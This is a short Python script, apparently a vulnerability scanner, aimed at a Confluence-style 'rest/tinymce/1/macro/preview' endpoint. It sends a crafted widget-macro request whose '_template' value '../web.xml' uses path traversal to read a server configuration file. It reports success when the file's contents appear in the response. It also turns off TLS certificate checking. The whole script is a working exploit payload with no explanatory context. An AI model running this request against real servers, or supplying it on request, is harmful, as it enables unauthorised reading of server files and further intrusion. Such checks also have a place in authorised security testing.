import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"rest/tinymce/1/macro/preview"
	body='{"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/test","width":"1000","height":"1000","_template":"../web.xml"}}}'
	headers={'Content-Type': 'application/json', 'Referer': 'http://localhost'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "<param-name>contextConfigLocation</param-name>" in response.text:
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
